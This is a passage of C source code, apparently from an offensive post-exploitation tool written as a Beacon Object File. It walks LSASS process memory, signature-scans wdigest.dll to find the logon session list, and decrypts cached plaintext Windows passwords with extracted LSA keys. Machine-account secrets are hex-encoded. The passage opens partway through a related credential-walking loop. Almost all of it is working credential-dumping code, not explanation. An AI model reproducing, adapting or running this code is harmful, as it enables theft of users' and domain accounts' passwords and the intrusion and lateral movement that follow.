            wchar_t user[MAX_STR_LEN]   = {0};
            wchar_t domain[MAX_STR_LEN] = {0};
            read_ustr(h, dtb, data.data, offsets.user,   user,   MAX_STR_LEN);
            read_ustr(h, dtb, data.data, offsets.domain, domain, MAX_STR_LEN);
            uint64_t cred = rp(data.data, offsets.cred_ptr);

            if (user[0] != L'\0' && cred)
                walk_creds(h, dtb, cred, keys, out, user, domain);

            entry = rp(data.data, 0);  // flink
            Bytes_free(&data);
        }
    }
}

// ================================================================
// WDigest credential extraction
// ================================================================
void extract_wdigest_creds(HANDLE h, uint64_t dtb,
                            uint64_t LSASS_eprocess, uint32_t peb_offset,
                            const LsaKeys* keys,
                            WDigestList* out) {
    // Find wdigest.dll in LSASS module list
    internal_printf("[*] Finding wdigest.dll in LSASS...\n");
    ModuleInfo wmod;
    if (!find_module(h, dtb, LSASS_eprocess, peb_offset, L"wdigest.dll", &wmod)) {
        internal_printf("[-] wdigest.dll not found in LSASS module list\n");
        return;
    }
    internal_printf("  wdigest.dll base=0x%llx size=0x%x\n", wmod.base, wmod.size);

    // Read wdigest.dll from disk
    Bytes dll_bytes = read_dll_from_disk(L"wdigest.dll");
    if (dll_bytes.size < 0x1000) {
        Bytes_free(&dll_bytes);
        internal_printf("[-] Cannot read wdigest.dll from System32\n");
        return;
    }

    PeSectionInfo text = find_pe_text_section(&dll_bytes);
    if (!text.raw_size || text.raw_offset + text.raw_size > dll_bytes.size) {
        Bytes_free(&dll_bytes);
        internal_printf("[-] Cannot find .text section in wdigest.dll\n");
        return;
    }

    const uint8_t* text_raw = dll_bytes.data + text.raw_offset;
    uint32_t sig_off = 0;
    uint32_t i;
    const uint8_t wdigest_sig[] = { 0x48, 0x3b, 0xd9, 0x74 };
    for (i = 4; i + sizeof(wdigest_sig) <= text.raw_size; i++) {
        if (MSVCRT$memcmp(text_raw + i, wdigest_sig, sizeof(wdigest_sig)) == 0) {
            sig_off = i;
            break;
        }
    }

    if (!sig_off) {
        Bytes_free(&dll_bytes);
        internal_printf("[-] WDigest l_LogSessList signature not found\n");
        return;
    }

    // Resolve RIP-relative: disp32 at text_raw[sig_off - 4]
    int32_t disp;
    MSVCRT$memcpy(&disp, text_raw + sig_off - 4, 4);
    uint32_t sig_rva    = text.virtual_address + sig_off;
    uint32_t target_rva = (uint32_t)((int32_t)sig_rva + disp);
    uint64_t list_head  = wmod.base + target_rva;
    Bytes_free(&dll_bytes);

    internal_printf("  l_LogSessList at 0x%llx (RVA=0x%x)\n", list_head, target_rva);

    // Verify list is mapped
    Bytes test_read = proc_read(h, dtb, list_head, 8);
    if (test_read.size < 8) {
        Bytes_free(&test_read);
        internal_printf("  WDigest: l_LogSessList not mapped\n");
        return;
    }
    int all_zero = 1;
    size_t bi;
    for (bi = 0; bi < 8; bi++) if (test_read.data[bi] != 0) { all_zero = 0; break; }
    if (all_zero) {
        Bytes_free(&test_read);
        internal_printf("  WDigest: l_LogSessList is zero (caching disabled or no logon since enable)\n");
        return;
    }

    uint64_t flink = rp(test_read.data, 0);
    Bytes_free(&test_read);

    uint64_t* seen_list = (uint64_t*)MSVCRT$malloc(200 * sizeof(uint64_t));
    if (!seen_list) return;
    int seen_count = 0;

    while (flink && flink != list_head && seen_count < 200) {
        int already = 0;
        int si;
        for (si = 0; si < seen_count; si++) if (seen_list[si] == flink) { already = 1; break; }
        if (already) break;
        seen_list[seen_count++] = flink;

        Bytes entry = proc_read(h, dtb, flink, 0x70);
        if (entry.size < 0x60) { Bytes_free(&entry); break; }

        wchar_t user[MAX_STR_LEN]   = {0};
        wchar_t domain[MAX_STR_LEN] = {0};
        read_ustr(h, dtb, entry.data, 0x30, user,   MAX_STR_LEN);
        read_ustr(h, dtb, entry.data, 0x40, domain, MAX_STR_LEN);

        if (user[0] != L'\0' && domain[0] != L'\0') {
            uint16_t pw_max_len = rw(entry.data, 0x52);
            uint16_t pw_len     = rw(entry.data, 0x50);
            uint64_t pw_ptr     = rp(entry.data, 0x58);

            if (pw_max_len > 0 && pw_len > 0 && pw_ptr) {
                Bytes enc_pw = proc_read(h, dtb, pw_ptr, pw_max_len);
                if (!Bytes_empty(&enc_pw)) {
                    // Pad to 8-byte alignment for 3DES
                    if (enc_pw.size % 8 != 0) {
                        size_t new_sz = (enc_pw.size + 7) & ~7ULL;
                        uint8_t* new_data = (uint8_t*)MSVCRT$malloc(new_sz);
                        MSVCRT$memcpy(new_data, enc_pw.data, enc_pw.size);
                        MSVCRT$memset(new_data + enc_pw.size, 0, new_sz - enc_pw.size);
                        MSVCRT$free(enc_pw.data);
                        enc_pw.data = new_data;
                        enc_pw.size = new_sz;
                        enc_pw.capacity = new_sz;
                    }

                    Bytes dec = lsa_decrypt(enc_pw.data, enc_pw.size,
                                            keys->aes_key.data, keys->aes_key.size,
                                            keys->des_key.data, keys->des_key.size,
                                            keys->iv.data, keys->iv.size);
                    if (!Bytes_empty(&dec)) {
                        // Null-terminate as wchar_t
                        if (dec.size + 2 <= dec.capacity) {
                            dec.data[dec.size]     = 0;
                            dec.data[dec.size + 1] = 0;
                        }
                        const wchar_t* pw = (const wchar_t*)dec.data;
                        size_t pwlen = MSVCRT$wcslen(pw);

                        if (pwlen > 0) {
                            WDigestinformation* item = (WDigestinformation*)MSVCRT$malloc(sizeof(WDigestinformation));
                            if (item) {
                                MSVCRT$memset(item, 0, sizeof(WDigestinformation));
                                size_t ulen = MSVCRT$wcslen(user);
                                size_t dlen = MSVCRT$wcslen(domain);
                                if (ulen >= MAX_STR_LEN) ulen = MAX_STR_LEN - 1;
                                if (dlen >= MAX_STR_LEN) dlen = MAX_STR_LEN - 1;
                                MSVCRT$memcpy(item->user,   user,   ulen * sizeof(wchar_t));
                                MSVCRT$memcpy(item->domain, domain, dlen * sizeof(wchar_t));

                                // Check if machine account (ends with $)
                                if (ulen > 0 && user[ulen-1] == L'$') {
                                    // Hex-encode the password bytes
                                    size_t hex_len = pw_len;
                                    if (hex_len > dec.size) hex_len = dec.size;
                                    char hex_tmp[MAX_STR_LEN] = {0};
                                    to_hex(hex_tmp, sizeof(hex_tmp), dec.data, hex_len);
                                    size_t hl = MSVCRT$strlen(hex_tmp);
                                    if (hl >= MAX_STR_LEN) hl = MAX_STR_LEN - 1;
                                    size_t hi;
                                    for (hi = 0; hi < hl; hi++) item->password[hi] = (wchar_t)(unsigned char)hex_tmp[hi];
                                } else {
                                    if (pwlen >= MAX_STR_LEN) pwlen = MAX_STR_LEN - 1;
                                    MSVCRT$memcpy(item->password, pw, pwlen * sizeof(wchar_t));
                                }
                                WDigestList_push(out, item);
                                MSVCRT$free(item);
                            }
                        }
                    }
                    Bytes_free(&dec);
                }
                Bytes_free(&enc_pw);
            }
        }

        flink = rp(entry.data, 0);
        Bytes_free(&entry);
    }
    MSVCRT$free(seen_list);
}
